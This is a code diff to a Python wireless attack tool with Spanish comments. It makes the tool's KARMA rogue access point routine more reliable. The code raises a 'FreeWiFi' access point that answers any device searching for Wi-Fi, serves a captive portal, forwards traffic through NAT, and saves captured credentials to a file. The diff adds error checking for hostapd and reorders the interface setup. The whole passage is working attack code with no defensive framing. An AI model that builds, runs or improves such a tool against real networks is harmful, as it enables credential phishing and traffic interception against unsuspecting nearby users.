@@ -3787,40 +3787,62 @@ class H(BaseHTTPRequestHandler):
 HTTPServer(("192.168.20.1",80),H).serve_forever()
 """)
 
-    run(f"ip addr flush dev {iface_ap}")
-    run(f"ip addr add 192.168.20.1/24 dev {iface_ap}")
-    run(f"ip link set {iface_ap} up")
+    # ── Preparar interfaz: managed mode, matar conflictos ────────────────────
+    info("Preparando interfaz...")
+    run("pkill -f hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null; sleep 0.3", capture=True)
+    run(f"ip link set {iface_ap} down 2>/dev/null")
+    run(f"iw dev {iface_ap} set type managed 2>/dev/null")
+    run(f"ip link set {iface_ap} up 2>/dev/null")
+    time.sleep(0.5)
+
     if iface_net:
         run("echo 1 > /proc/sys/net/ipv4/ip_forward")
         run(f"iptables -t nat -A POSTROUTING -o {iface_net} -j MASQUERADE")
 
-    # mdk4 en modo probe response para efecto KARMA si no hay hostapd-karma
     separador("KARMA ACTIVO")
-    ok(f"AP KARMA activo en canal {channel}")
-    ok(f"Responde a cualquier dispositivo que busque WiFi")
-    ok(f"Portal cautivo: http://192.168.20.1")
-    ok(f"Credenciales → {creds_file}")
-    warn("Presione CTRL+C para detener.")
-
     db_log_attack("KARMA Attack", "ANY", "-", channel, "activo", creds_file)
 
     try:
-        subprocess.Popen(["hostapd", karma_conf],
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(2)
+        # Arrancar hostapd y verificar que levantó correctamente
+        _hap_log = "/tmp/herradura_karma/hostapd.log"
+        with open(_hap_log, "w") as _hlog:
+            _hap = subprocess.Popen(["hostapd", karma_conf],
+                                    stdout=_hlog, stderr=_hlog)
+        time.sleep(3)
+
+        if _hap.poll() is not None:
+            # hostapd terminó prematuramente — mostrar error
+            separador("ERROR hostapd")
+            error("hostapd falló al arrancar. Detalle:")
+            try:
+                with open(_hap_log) as _lf:
+                    for _line in _lf.readlines()[-10:]:
+                        print(f"  {RED}{_line.rstrip()}{END}")
+            except Exception:
+                pass
+            pause_back()
+            return
+
+        # IP se asigna DESPUÉS de que hostapd puso la interfaz en AP mode
+        run(f"ip addr flush dev {iface_ap} 2>/dev/null")
+        run(f"ip addr add 192.168.20.1/24 dev {iface_ap} 2>/dev/null")
+
+        ok(f"AP '{WHITE}FreeWiFi{END}' activo en canal {channel}")
+        ok(f"Responde a cualquier dispositivo que busque WiFi")
+        ok(f"Portal cautivo: http://192.168.20.1")
+        ok(f"Credenciales → {creds_file}")
+        warn("Presione CTRL+C para detener.")
+
         subprocess.Popen(["dnsmasq", "-C", "/tmp/herradura_karma/dnsmasq.conf", "--no-daemon"],
                          stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(1)
-        # mdk4 probe response mode para mayor alcance KARMA
-        if check_tool("mdk4"):
-            subprocess.Popen(f"mdk4 {iface_ap} p 2>/dev/null", shell=True,
-                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(["python3", server_script],
-            stdin=subprocess.DEVNULL)
+
+        subprocess.run(["python3", server_script], stdin=subprocess.DEVNULL)
+
     except KeyboardInterrupt:
         pass
     finally:
-        run("pkill hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null; pkill mdk4 2>/dev/null")
+        run("pkill -f hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null")
         if iface_net:
             run(f"iptables -t nat -D POSTROUTING -o {iface_net} -j MASQUERADE 2>/dev/null")
         ok("KARMA detenido.")
